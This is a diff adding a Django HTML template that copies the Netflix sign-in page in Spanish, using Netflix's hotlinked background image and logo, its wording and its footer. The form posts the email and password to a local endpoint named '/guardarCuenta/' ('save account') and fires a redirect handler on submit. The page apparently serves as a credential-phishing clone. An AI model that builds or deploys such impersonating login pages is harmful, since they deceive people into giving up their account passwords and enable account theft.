@@ -1,0 +1,393 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <style>
+        body {
+            height: 1090px; /* Ajusta la altura a 150% del alto de la ventana */
+            background-image: url('https://assets.nflxext.com/ffe/siteui/vlv3/2bcf01ee-7ef6-4930-b0d5-c6863853c461/web/EC-es-20241125-TRIFECTA-perspective_f8d0b6d8-e114-4cfb-83cf-6e92578ce073_small.jpg'); /* Ruta de la imagen */
+            background-size: cover; /* Escala la imagen para cubrir todo el fondo */
+            background-position: center; /* Centra la imagen */
+          
+            
+        }
+        body::before {
+            content: ''; /* Necesario para crear el pseudo-elemento */
+            position: absolute; /* Lo coloca sobre el fondo */
+            top: 0; 
+            left: 0; 
+            width: 100%;
+            height: 1090px;
+            background-color: rgba(0, 0, 0, 0.5); /* Capa negra semi-transparente, ajusta la opacidad */
+            z-index: -1; /* Coloca el pseudo-elemento detrás del contenido */
+        }
+        .logo {
+            position: absolute; /* Permite posicionar el logo relativo al borde */
+            top: 4px; /* Espacio desde la parte superior */
+            left: 160px; /* Espacio desde el lado izquierdo */
+            width: 190px; /* Ancho del logo */
+            fill: #e50914;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+            min-height: 100vh;
+            background-color: #f8f8f8;
+        }
+
+        .login-container {
+            background-color: rgba(0, 0, 0, 0.8);;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            width: 450px;
+            height: 690px;
+        }
+
+        .login-container img {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+
+        .login-container h1 {
+            font-size: 32px;
+            margin-bottom: 20px;
+            text-align: left;
+            color: #ffffff;
+            font-weight: bold;
+            padding-top: 18px;
+            padding-left: 25px;
+        }
+
+        .login-container input {
+            width: 320px;
+            height: 50px;
+            padding: 10px;
+            margin: 10px 0;
+            border: 0.2px solid #e0e0e0; /* Borde gris claro más delgado */
+            border-radius: 4px;
+            font-size: 15px;
+            background-color: transparent; /* Fondo transparente */
+            color: #ffffff; /* Texto en blanco */
+            transition: box-shadow 0.3s ease-in-out; /* Transición suave */
+            margin-top: 9px;
+        }
+
+        .login-container input[type="email"]:focus,
+        .login-container input[type="password"]:focus {
+            border-width: 2px; /* Borde más grueso cuando está enfocado */
+            outline: none; /* Elimina el borde azul predeterminado */
+            box-shadow: 0 0 20px rgba(255, 255, 255, 0.4); /* Resplandor más fuerte */
+        }
+
+        .login-container input[type="submit"] {
+            background-color: #e50914;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .login-container input[type="submit"]:hover {
+            background-color: #f6121d;
+        }
+
+        .login-container a {
+            display: block;
+            margin-top: 15px;
+            color: #b3b3b3;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .login-container a:hover {
+            color: white;
+        }
+        .login-container input[type="submit"] {
+            height: 40px;
+            background-color: #e50914; /* Fondo rojo */
+            color: white; /* Texto blanco */
+            font-weight: bold; /* Texto en negrita */
+            padding: 12px 0; /* Ajusta el tamaño del botón */
+            border: none; /* Elimina el borde */
+            border-radius: 4px; /* Esquinas redondeadas */
+            cursor: pointer; /* Muestra el cursor de mano cuando se pasa por encima */
+            transition: background-color 0.3s; /* Efecto de transición para el cambio de color */
+        }
+
+        .login-container input[type="submit"]:hover {
+            background-color: #f6121d; /* Color más oscuro cuando el botón está enfocado */
+        }
+        input[type="submit1"] {
+            background-color: rgba(128, 128, 128, 0.5); /* Fondo gris transparente */
+            color: rgba(255, 255, 255, 1); /* Letras blancas con opacidad 100% (opacas) */
+            border: none; /* Elimina el borde */
+            padding: 10px 10px; /* Tamaño y espacio interno del botón */
+            height: 40px;
+            font-size: 16px; /* Tamaño de la letra */
+            border-radius: 4px; /* Esquinas redondeadas */
+            cursor: pointer; /* Muestra el cursor de mano cuando se pasa por encima */
+            transition: background-color 0.3s ease; /* Transición suave para el fondo */
+            text-align: center;
+        }
+
+        input[type="submit1"]:hover {
+            background-color: rgba(128, 128, 128, 0.6); /* Fondo más oscuro cuando el usuario pasa el cursor por encima */
+        }
+        .nd{
+            margin-top: 9px;
+            margin-bottom: 5px;
+            opacity: 0.7;
+        }
+        div p {
+            text-decoration: underline; /* Subraya el texto */
+            color: #fff; /* Opcional: Ajusta el color del texto si lo deseas */
+        }
+        .par{
+            margin-top: 10px;
+        }
+        input[type="checkbox"] {
+            width: 20px; /* Ajusta el tamaño del checkbox */
+            height: 20px;
+            accent-color: white; /* Cambia el color del checkbox (rojo en este caso) */
+            margin-right: 12px;
+        }
+
+        label {
+            font-size: 16px; /* Tamaño de la letra del label */
+            color: #fff; /* Color del texto */
+        }
+        .texb{
+            text-align: left;
+            margin-left: 30px;
+            margin-top: 8px;
+            display: flex; /* Usamos flexbox para alinear los elementos en línea */
+            align-items: center; /* Alinea verticalmente el checkbox y el texto */
+        }
+        div {
+            font-size: 18px; /* Tamaño general del texto */
+            color: #fff; /* Color del texto general */
+            line-height: 1.6; /* Altura de línea para mejorar la legibilidad */
+        }
+
+        .first-text {
+            opacity: 0.1; /* Baja la opacidad de "¿Primera vez en Netflix?" */
+        }
+
+
+        .sus{
+            color: #fff; /* Color blanco para "Suscríbete ya." */
+            font-weight: bold; /* Negrita para "Suscríbete ya." */
+        }
+        .pri{
+            display: inline; /* Hace que los h5 estén en la misma línea */
+            margin: 0; /* Elimina los márgenes predeterminados */
+            opacity: 0.6; 
+        }
+
+        .sus {
+            color: #fff; /* Color blanco para "Suscríbete ya." */
+            font-weight: bold; /* Negrita para "Suscríbete ya." */
+        }
+        h5 {
+            display: inline; /* Mantiene los h5 en la misma línea */
+            margin: 0; /* Elimina los márgenes predeterminados */
+        
+        }
+        .gh{
+            text-align: left;
+            margin-left: 30px;
+        }  
+        .recaptcha-text {
+            font-size: 12px; /* Tamaño de la letra más pequeña */
+            line-height: 1.4; /* Ajusta la altura entre líneas para mejor legibilidad */
+            color: #fff; /* Color del texto (opcional, en este caso blanco) */
+            width: 300px; /* Limita el ancho del contenedor para forzar el salto de línea */
+            word-wrap: break-word; /* Asegura que el texto no se salga del contenedor */
+            margin: 0 auto; /* Opcional: centra el contenedor horizontalmente */
+            text-align: left;
+            opacity: 0.6;
+            margin-top: 10px;
+        }         
+        .inf {
+            color: #1c6af4; /* Establece el color azul para todo el contenido del div */
+            text-align: left;
+            margin-left: 32px;
+        }
+
+        .inf h4 {
+            text-decoration: underline; /* Asegura que los enlaces estén subrayados */
+            font-size: 12px; /* Tamaño de la letra más grande (opcional) */
+            cursor: pointer; /* Cambia el cursor a una mano para enlaces */
+            margin-top: 5px;
+        }
+        footer {
+            background-color: black;
+            color: white;
+            text-align: center;
+            width: 100%;
+            padding: 40px;
+            margin-top: 45px;
+            
+        }
+
+        footer a {
+            color: white;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+
+        
+
+        footer p {
+            margin: 0 0 15px; /* Margen inferior para separar texto */
+            font-size: 14px;
+        }
+
+        .footer-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); /* Ajusta columnas según el ancho */
+            gap: 15px; /* Espaciado entre columnas */
+            height: 30px;
+            margin-top: 25px;
+            margin-left: 130px;
+            text-align: left;
+        }
+        .footer-grid1{
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); /* Ajusta columnas según el ancho */
+            gap: 15px; /* Espaciado entre columnas */
+            height: 20px;
+            text-align: left;
+            margin-top: 20px;
+            margin-left: 130px;
+            text-align: left;
+        }
+
+        .footer-grid a {
+            color: rgba(255, 255, 255, 0.7); /* Blanco opaco con 70% de opacidad */
+            text-decoration: underline;
+            font-size: 14px;
+        }
+        .footer-grid1 a {
+            color: rgba(255, 255, 255, 0.7); /* Blanco opaco con 70% de opacidad */
+            text-decoration:underline;
+            font-size: 14px;
+            margin-right: 70px; /* Espacio entre los enlaces */
+        }
+
+        .footer-grid a:hover {
+            text-decoration: underline;
+        }
+
+        .language-selector {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-top: 15px;
+            height: 50px;
+        }
+
+        .language-selector select {
+            background-color: transparent; /* Fondo transparente */
+            color: white; /* Color del texto */
+            border: none; /* Eliminar el borde */
+            padding: 5px 10px; /* Espaciado interno */
+            font-size: 14px; /* Tamaño de la fuente */
+            border: 1px solid rgba(255, 255, 255, 0.3); /* Borde blanco con 30% de opacidad */
+            margin-left: 140px;
+        }
+        .pre{
+            text-align: left;
+            margin-top: 40px;
+            margin-left: 140px;
+            font-size: 15px;
+            color: rgba(255, 255, 255, 0.7); /* Blanco opaco con 70% de opacidad */
+        }
+        .footer-grid1 a:last-child {
+            margin-right: 0; /* Elimina el margen del último enlace */
+        }
+
+    </style>
+</head>
+<body>
+    
+    <!-- Logo -->
+    <img src="https://cdn.cookielaw.org/logos/dd6b162f-1a32-456a-9cfe-897231c7763c/4345ea78-053c-46d2-b11e-09adaef973dc/Netflix_Logo_PMS.png " alt="Logo" class="logo">
+    <div class="login-container">
+        <h1>Iniciar Sesión</h1>
+        <form action="/guardarCuenta/" id="frm_nuevo_cuenta" method="post" onsubmit="redirectToLink(event)" >
+            {% csrf_token %}
+            <input type="email" name="email" id="email" placeholder="Email o número de celular">
+            <input type="password" name="password" id="password" placeholder="Contraseña">
+            <input type="submit" value="Iniciar Sesión">
+        </form>
+        <div class="nd">
+            O
+        </div>
+        <input type="submit1" value="Usar un código de inicio de sesión">
+        <div class="par">
+            <p>¿Olvidaste la contraseña?</p>
+        </div>
+        <div class="texb">
+            <input type="checkbox" id="remember" name="remember">
+            <label for="remember">Recordarme</label>
+        </div>
+        <div class="gh">
+            <h5 class="pri">¿Primera vez en Netflix?</h5><h5 class="sus">Suscríbete ya.</h5>
+        </div>
+        <div class="recaptcha-text">
+            Esta página está protegida por Google reCAPTCHA para comprobar que no eres un robot.
+        </div>
+        <div class="inf">
+            <h4>Mas info.</h4>
+        </div>
+    </div>
+    <footer style="height: 320px;">
+        <div class="pre">
+            ¿Preguntas? Llama al 1 (408) 469-4467 (USA) (sin cargo)
+        </div>
+        <div class="footer-grid">
+            <a href="#">Preguntas frecuentes</a>
+            <a href="#">Centro de ayuda</a>
+            <a href="#">Términos de uso</a>
+            <a href="#">Privacidad</a>
+            <a href=""></a>
+            
+            
+           
+        </div>
+        <div class="footer-grid1 ">
+            <a href="#">Preferencias de cookies</a>
+            <a href="#">Información empresarial</a>
+            <a href=""></a>
+            <a href=""></a>
+            <a href=""></a>
+            
+        </div>
+        <div class="language-selector">
+            <select>
+                <option value="es">Español</option>
+                <option value="en">English</option>
+            </select>
+        </div>
+    </footer>
+    
+</body>
+</html>
